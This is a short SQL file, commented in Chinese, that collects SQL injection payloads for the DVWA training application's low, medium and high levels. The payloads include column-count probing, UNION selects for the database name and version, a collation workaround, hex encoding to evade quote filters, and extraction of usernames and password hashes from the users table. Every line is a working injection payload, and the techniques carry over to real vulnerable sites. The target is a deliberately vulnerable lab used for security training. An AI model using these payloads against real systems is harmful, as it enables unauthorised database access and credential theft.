```sql
-- ======================================================
-- DVWA SQL Injection Payloads Collection
-- ======================================================

-- 【Low Level】: 基础字符串型注入
-- 探测字段数
1' order by 2 #
-- 获取数据库信息
1' union select database(), version() #

-- 【Medium Level】: 数字型注入 + 绕过过滤
-- 1. 解决编码冲突 (Illegal mix of collations)
1 union select 1, group_concat(table_name) collate utf8_general_ci from information_schema.tables where table_schema=database() #

-- 2. 十六进制绕过引号过滤 (0x7573657273 = 'users')
1 union select 1, group_concat(column_name) collate utf8_general_ci from information_schema.columns where table_name=0x7573657273 #

-- 3. 获取敏感数据
1 union select user, password from users #

-- 【High Level】: 绕过 LIMIT 限制
-- 注释掉后端硬编码的 LIMIT 1
1' union select user, password from users #
